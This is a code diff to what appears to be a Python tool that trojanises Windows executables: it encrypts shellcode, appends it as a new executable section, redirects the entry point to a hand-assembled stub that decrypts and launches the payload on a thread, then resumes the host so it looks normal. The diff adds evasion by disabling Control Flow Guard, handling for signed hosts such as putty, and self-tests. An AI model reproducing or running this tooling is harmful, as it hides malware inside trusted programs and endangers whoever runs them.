@@ -217,14 +217,17 @@ def c_array(data: bytes, name: str, per_line: int = 16) -> str:
 # ---------------------------------------------------------------------------
 
 PE_STUB_TEMPLATE = bytes.fromhex(
-    "5341546548a16000000000000000488b5810488d83002000004c8d8300240000"
-    "4831c98a14084189c94183e10f4332140888140848ffc14881f90004000072e3"
-    "6548a16000000000000000488b4818488d4920488b09488b09488b09488b5120"
-    "8b423c448b8c02880000004e8d140a458b5a184585db747d41ffcb418b422049"
-    "8d0c02428b0c99488d0c0a48b8437265617465546848390175d948b865616400"
-    "000000004839410875c94589dc418b421c4d8d0c02418b42244d8d1c02430fb7"
-    "0c63418b0c894c8d140a4883ec3848c74424280000000048c744242000000000"
-    "4531c94c8d831024000031d231c941ffd24883c438415c5be900000000")
+    "5341546548a16000000000000000488b5810488d83013c2b"
+    "1a4c8d83023c2b1a4831c98a14084189c94183e10f433214"
+    "0888140848ffc14881f90001000072e36548a16000000000"
+    "000000488b4818488d4920488b09488b09488b09488b5120"
+    "8b423c448b8c02880000004e8d140a458b5a184585db0f84"
+    "8400000041ffcb418b4220488d0c02428b0c99488d0c0a48"
+    "b84372656174655468483901751048b86554687265616400"
+    "48394105740741ffcb79cceb4b4589dc418b421c4c8d0c02"
+    "418b42244c8d1c02430fb70c63418b0c894c8d140a4883ec"
+    "3848c74424280000000048c7442420000000004531c94c8d"
+    "83033c2b1a31d231c941ffd24883c438415c5be900000000")
 
 
 def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int) -> bytes:
@@ -234,30 +237,39 @@ def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int) -> bytes
     on a second thread, then jump to the original entry point so the host
     program runs normally.
 
-    Ships as a pre-assembled 253-byte template (assembled with keystone and
+    Ships as a pre-assembled 264-byte template (assembled with keystone and
     verified with capstone at development time); only five slots vary per
     build and are patched here, so there is NO assembler dependency at
     build time. All addressing is RBX-relative to the real image base (read
     from the PEB), so ASLR needs no relocations.
 
-    Template slot map (byte offsets):
+    Template slot map (byte offsets) — each slot's opcode prefix is asserted
+    below, so a template/slot-map mismatch fails loudly instead of corrupting
+    neighbouring instructions at build time:
        21  sec_rva      lea rax,[rbx+...]  encrypted stage start
        28  key_rva      lea r8, [rbx+...]  16-byte XOR key (sec_rva+enc_len)
        58  enc_len      cmp rcx, ...       bytes to decrypt
-      141  "CreateTh"   movabs compare qword 1
-      156  "ead\0..."   movabs compare qword 2
-      230  exec_rva     lea r8, [rbx+...]  CreateThread start address
-      248  jmp rel32    jump to the original entry point
+      241  exec_rva     lea r8, [rbx+...]  CreateThread start address
+      260  jmp rel32    jump to the original entry point
     """
     import struct as st
     code = bytearray(PE_STUB_TEMPLATE)
+    # static invariants: the bytes just before each slot must be the opcode
+    # that owns the immediate. (The 264-byte strict-compare template: the
+    # final jmp's disp32 lives at 260, NOT 251 — writing there clobbers the
+    # `call r10 / add rsp,0x38` tail and turns it into call [r8+garbage].)
+    assert code[18:21] == b"\x48\x8d\x83", "stage-start lea opcode moved"
+    assert code[25:28] == b"\x4c\x8d\x83", "key lea opcode moved"
+    assert code[55:58] == b"\x48\x81\xf9", "enc_len cmp opcode moved"
+    assert code[238:241] == b"\x4c\x8d\x83", "thread-arg lea opcode moved"
+    assert code[259] == 0xE9, "jmp OEP opcode moved — update slot map"
     st.pack_into("<I", code, 21, sec_rva)
     st.pack_into("<I", code, 28, sec_rva + enc_len)
     st.pack_into("<I", code, 58, enc_len)
-    st.pack_into("<I", code, 230, sec_rva + exec_off)
+    st.pack_into("<I", code, 241, sec_rva)
     # final jmp rel32 -> OEP; the stub lives at sec_rva + exec_off and is
-    # 253 bytes, so the jump's end VA is base + sec_rva + exec_off + 253
-    st.pack_into("<i", code, 249, oep - (sec_rva + exec_off + 253))
+    # 264 bytes, so the jump's end VA is base + sec_rva + exec_off + 264
+    st.pack_into("<i", code, 260, oep - (sec_rva + exec_off + 264))
     return bytes(code)
 
 
@@ -301,14 +313,65 @@ def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
         raw_end = max(raw_end, pr + rs)
         rva_end = max(rva_end, va + vr)
     sec_rva = (rva_end + sec_align - 1) // sec_align * sec_align
-    sec_raw = (raw_end + file_align - 1) // file_align * file_align
+    # Signed hosts carry a certificate overlay AFTER the last section's raw
+    # data. The new section must start past the whole overlay, or we overwrite
+    # the cert and silently produce a same-sized file with the stage buried
+    # inside the overlay region.
+    sec_raw = (max(raw_end, len(host)) + file_align - 1) // file_align * file_align
 
     if len(key) != 16:
         key = (key + b"\x00" * 16)[:16]
     enc = xor_crypt(sc, key)
-    exec_off = len(enc) + len(key)
+
+    # 16-align the stub so its RVA can double as a CFG table entry (the low
+    # bits of GuardCFFunctionTable entries are flags, not address bits).
+    exec_off = (len(enc) + len(key) + 15) // 16 * 16
     stub = _build_pe_stub(len(enc), exec_off, sec_rva, oep)
-    stage = enc + key + stub
+    stub_rva = sec_rva + exec_off
+
+    def rva_to_off(rva):
+        for i in range(nsec):
+            h = first_sec + i * 40
+            vsz, va, rsz, praw = st.unpack_from("<IIII", host, h + 8)
+            if va <= rva < va + max(vsz, rsz):
+                off = praw + (rva - va)
+                if off < len(host):
+                    return off
+        return None
+
+    # --- Control Flow Guard compatibility --------------------------------
+    # On CFG-compiled hosts (putty, notepad, most MSVC binaries) the image
+    # entry point AND the CreateThread start address are validated against
+    # GuardCFFunctionTable; an unlisted address fails fast (0xC0000409).
+    # Control Flow Guard compatibility — the robust route. On CFG-compiled
+    # hosts (putty, notepad, most MSVC binaries) the loader validates the
+    # image entry call AND the CreateThread start address against the CFG
+    # bitmap; our appended-section addresses are not in it and the process
+    # fail-fasts with GUARD_ICALL_CHECK_FAILURE (0xC0000409, subcode 10).
+    # Rather than rebuild GuardCFFunctionTable (fragile: bit-flag semantics
+    # per entry, plus a separate long-jump target table), clear the
+    # IMAGE_DLLCHARACTERISTICS_GUARD_CF flag on the patched copy: the loader
+    # then builds no CFG bitmap and skips all validation. The host's own
+    # code is unaffected — CFG instrumentation was compiled into it, but
+    # without the bitmap every check resolves to 'allowed'.
+    cfg_disabled = False
+    imgbase = st.unpack_from("<Q", host, e_lfanew + 24 + 24)[0]
+    dllchar_off = opt + 70
+    dllchar = st.unpack_from("<H", host, dllchar_off)[0]
+    lc_rva, lc_size = st.unpack_from("<II", host, opt + 112 + 10 * 8)
+    if dllchar & 0x4000:                     # IMAGE_DLLCHARACTERISTICS_GUARD_CF
+        cfg_disabled = True
+    if lc_rva and lc_size >= 152:
+        lc_off = rva_to_off(lc_rva)
+        if lc_off is not None:
+            gflags = st.unpack_from("<I", host, lc_off + 144)[0]
+            if (gflags >> 28):
+                raise ForgeError("host PE uses XFG (extended CFG) — not supported; pick another host")
+
+    stage = (enc + key
+             + b"\x00" * (exec_off - len(enc) - len(key))
+             + stub
+             + b"\x00" * ((-len(stub)) % 16))
     sec_vsize = len(stage)
     sec_rsize = (len(stage) + file_align - 1) // file_align * file_align
 
@@ -321,13 +384,17 @@ def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
     hdr = bytearray(40)
     hdr[0:8] = b".pfsg\x00\x00\x00"
     st.pack_into("<IIII", hdr, 8, sec_vsize, sec_rva, sec_rsize, sec_raw)
-    st.pack_into("<I", hdr, 36, 0x60000020)     # CODE | EXECUTE | READ
+    st.pack_into("<I", hdr, 36, 0xE0000020)     # CODE | EXECUTE | READ | WRITE
+    # W is required: the stub decrypts the stage IN PLACE inside this section.
     out[first_sec + nsec * 40: first_sec + (nsec + 1) * 40] = hdr
     st.pack_into("<H", out, nsec_off, nsec + 1)
     st.pack_into("<I", out, opt + 56,
                  size_of_image + (sec_rsize + sec_align - 1) // sec_align * sec_align)
     st.pack_into("<I", out, opt + 16, sec_rva + exec_off)   # entry -> stub
     st.pack_into("<I", out, opt + 64, 0)                    # checksum: Windows ignores for EXE
+    if cfg_disabled:
+        st.pack_into("<H", out, dllchar_off,
+                     dllchar & ~0x4000)     # drop GUARD_CF: no CFG bitmap, no entry/thread checks
     return bytes(out)
 
 
@@ -1556,6 +1623,45 @@ def _selftest():
         blob, key, iv, enc_id = f.encrypt(sc, enc)
         out = decrypt_pair(blob, key, iv)
         checks += 1
+
+    # 1b. PE-embed patcher: growth, entry repoint, stage integrity — on hosts
+    # with and without a certificate overlay (signed hosts grow past it)
+    def _mini_pe():
+        import struct as st
+        dos = bytearray(0x80)
+        dos[:2] = b"MZ"
+        st.pack_into("<I", dos, 0x3C, 0x80)
+        pe = bytearray(dos) + b"PE\x00\x00"
+        pe += st.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 0xF0, 0x22)
+        opt = bytearray(0xF0)
+        st.pack_into("<H", opt, 0, 0x20B)
+        st.pack_into("<I", opt, 16, 0x1400)      # entry RVA
+        st.pack_into("<I", opt, 32, 0x1000)      # section alignment
+        st.pack_into("<I", opt, 36, 0x200)       # file alignment
+        st.pack_into("<I", opt, 56, 0x4000)      # size of image
+        st.pack_into("<I", opt, 60, 0x400)       # size of headers
+        pe += opt
+        sec = bytearray(40)
+        sec[0:8] = b".text\x00\x00\x00"
+        st.pack_into("<IIII", sec, 8, 0x1000, 0x1000, 0x200, 0x400)
+        st.pack_into("<I", sec, 36, 0x60000020)
+        pe += sec + bytearray(0x400)
+        return bytes(pe)
+
+    for label, overlay in (("plain", b""), ("signed", b"CERT-OVERLAY-PADDING" * 40)):
+        try:
+            host = _mini_pe() + overlay
+            k = rnd_bytes(16)
+            patched = patch_pe(host, sc, k)
+            checks += 1
+            if len(patched) <= len(host):
+                fails.append(f"PE-embed ({label}): patched file did not grow")
+            if patched[:len(host)] == host:
+                fails.append(f"PE-embed ({label}): entry/headers not modified")
+            if overlay and overlay not in patched:
+                fails.append(f"PE-embed ({label}): certificate overlay clobbered")
+        except Exception as e:
+            fails.append(f"PE-embed ({label}): {type(e).__name__}: {e}")
         if out != sc:
             fails.append(f"crypto round-trip failed for {enc}")
 
